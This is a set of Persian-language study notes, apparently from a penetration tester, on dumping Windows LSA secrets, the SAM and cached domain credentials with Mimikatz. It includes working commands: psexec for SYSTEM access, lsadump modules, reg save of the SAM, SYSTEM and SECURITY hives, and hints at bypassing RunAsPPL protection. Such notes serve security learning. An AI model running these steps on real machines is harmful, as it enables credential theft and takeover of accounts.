
یک مسیر ریجستری است که توسط lsa محافظت میشه (protect) میشه 
توی مسیر ریجستری هست و یه سری موارد توشه ازجمله 
ماشین اکانت ها  , private Key  
secret key که برای encrypt هست 
chace domain password 
private key for RDP 

اینا مواردی هستند که در مسیر ریحستری وجود دارد که توسط LSA محافظت میشود 

![[Pasted image 20250830095332.png]]


## نکته : اگر VPN هم داشته باشیم پسورد اون VPN داخل lsa secrets ذحیره میشود 


```
lsadump::secrets
```

در بعضی موارد ممکن است که ما نتونیم ریجتسری هایی مربوط به lsa  رو دامپ کنیم 


lsadump::secrets
lsadump::sam
lsadump::cache

زیرا چون توسط LSA در حال Protect یا همون محافظت شده اند 

![[Pasted image 20250830102512.png]]

اگر یک همچین اروری گرفتین یعنی پروسس که میشه mimikatz دسترسی لازم برای انجام اینکار نداره چون این و دلایل مختلفی میتونه وجود داشته باشد 
1- توسط AV/EDR شناسایی شده 
2- توسط LSA در حال محافظت است 
3- با سطح دسترسی پایینی mimikatz را اجرا کردیم 
4- مکانیزم UAC باز شده و باید BYpass شود 

اگر توسط LSA در حال محافظت بود باید value مربوط به کلید LSA رو به نوعی از کار بندازیمش

```
HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL

```
- اگه مقدارش `1` باشه → LSA محافظت‌شده‌ست.
    
- برای دور زدنش: یا باید LSA Protection رو غیرفعال کنی (نیاز به ریبوت داره) یا از تکنیک‌های **PPL Bypass** استفاده کنی (مثل ابزار **PPLdump** یا **mimipenguin-like bypasses**).


---

### 🔹 ۱. چرا مسیر **RunAsPPL** ممکنه وجود نداشته باشه؟

- کلید رجیستری `RunAsPPL` فقط وقتی ساخته می‌شه که:
    
    1. سیستم عامل ویندوز جدید باشه (۸.۱ به بعد).
        
    2. **LSASS Protection (LSA Protection / RunAsPPL)** به صورت دستی یا با Group Policy فعال شده باشه.
        

📌 اگه این کلید **وجود نداشته باشه** یعنی به صورت پیش‌فرض **LSA Protection فعال نیست**.  
پس مشکل تو از این قسمت نیست.

---

### 🔹 ۲. پس چرا Mimkatz ارور Access Denied داده؟

حالا که RunAsPPL وجود نداره، علت‌های دیگه باقی می‌مونه:

1. **Mimikatz رو با Administrator عادی اجرا کردی.**
    
    - برای دسترسی به SAM hive باید سطح دسترسی **SYSTEM** داشته باشی، نه فقط Admin.
        
2. **آنتی‌ویروس / EDR دخالت کرده.**
    
    - بعضی AV/EDRها روی کلیدهای SAM، SECURITY و SYSTEM هوک می‌زنن و اجازه نمی‌دن باز بشن.
        
3. **هایوهای رجیستری قفل بودن.**
    
    - SAM، SYSTEM و SECURITY توی حالت عادی قفل هستن (چون توسط LSASS استفاده می‌شن).
        

---

### 🔹 ۳. راه‌حل عملی

برای حل این مشکل ۲ روش داری:

#### ✅ روش ۱: اجرای Mimikatz به عنوان SYSTEM

با `psexec` از Sysinternals:

```bash
psexec -i -s cmd.exe
```

بعد توی اون CMD باز شده:

```bash
mimikatz.exe
mimikatz # privilege::debug
mimikatz # lsadump::sam
```

#### ✅ روش ۲: مستقیم hiveها رو dump کن

اگه دسترسی SYSTEM نداری یا AV اذیت می‌کنه، می‌تونی hiveها رو دستی export کنی:

```bash
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
reg save HKLM\SECURITY security.save
```

بعدش فایل‌ها رو بده به Mimikatz یا ابزار دیگه:

```bash
lsadump::sam /sam:sam.save /system:system.save /security:security.save
```


![[Pasted image 20250830103932.png]]


---

📌 جمع‌بندی:

- نبودن `RunAsPPL` یعنی LSA Protection فعال نیست.
    
- دلیل خطا = اجرا نکردن با SYSTEM یا بلاک شدن توسط AV/EDR.
    
- راه حل = اجرا با SYSTEM (`psexec -i -s cmd.exe`) یا گرفتن offline hiveها (`reg save`).
    

---
